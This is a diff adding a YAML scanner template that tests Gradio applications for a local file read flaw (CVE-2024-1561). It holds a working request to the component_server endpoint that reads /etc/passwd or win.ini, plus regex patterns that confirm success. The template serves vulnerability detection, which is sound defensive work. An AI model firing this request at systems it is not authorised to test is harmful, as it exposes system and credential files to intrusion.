@@ -1,0 +1,143 @@
+id: GRADIO_LOCAL_FILE_READ
+info:
+  name: "Gradio Local File Read Vulnerability"
+  description: "This vulnerability allows attackers to exploit a flaw in Gradio applications to access local files on the host system. This vulnerability arises from insufficient input validation or improper file handling mechanisms. By manipulating file paths or input parameters, an attacker can read sensitive files, potentially leading to data exposure or security breaches. It highlights the need for stringent file access controls and validation to prevent unauthorized file access." 
+  details: "This vulnerability occurs when Gradio applications fail to adequately validate or restrict file paths provided by users. Attackers can exploit this by crafting malicious input that accesses local files outside the intended directory. This flaw allows unauthorized reading of sensitive files, such as configuration or credentials, from the host system. Proper input sanitization and access controls are essential to mitigate this risk."
+  impact: "The impact of this vulnerability is substantial, as it can lead to unauthorized access to sensitive files on the host system. This can expose critical information, such as configuration details or credentials, potentially facilitating further attacks or data breaches. The vulnerability undermines the application's security posture and could compromise the integrity and confidentiality of the host environment."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: GRADIO_LOCAL_FILE_READ
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2024-1561
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  url:
+    contains_either: gradio
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: content-type
+        extract: contentTypeHeader
+wordLists:
+  paths:
+    - "c:\\\\windows\\\\win.ini"
+    - "/etc/passwd"
+execute:
+  type: multiple
+  requests:
+  - req: 
+    - modify_method: POST
+    - modify_url: ${urlVar}/component_server
+    - modify_header:
+        contentTypeHeader: "application/json"
+    - replace_body: '{"component_id": "1", "data": "${paths}", "fn_name": "move_resource_to_block_cache", "session_hash": "aaaaaaaaaaa"}'
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          for_one:
+            key:
+              eq: "download_path"            
+            value:
+              regex: "\"?([^\"]+)"
+              extract: download_path_value
+          length:
+            gt: 0
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_method: GET
+    - modify_url: ${urlVar}/file=${download_path_value}
+    - replace_body: '{}'  
+    - validate:
+        response_payload:
+          regex: 
+            - "root:.*:0:0:"
+            - "\\[(font|extension|file)s\\]"
+        response_headers:
+          for_one:
+            key:
+              eq: Content-type
+            value:
+              eq: "text/plain"
+        response_code:
+          eq: 200
+    - success: vulnerable
+    - failure: exit
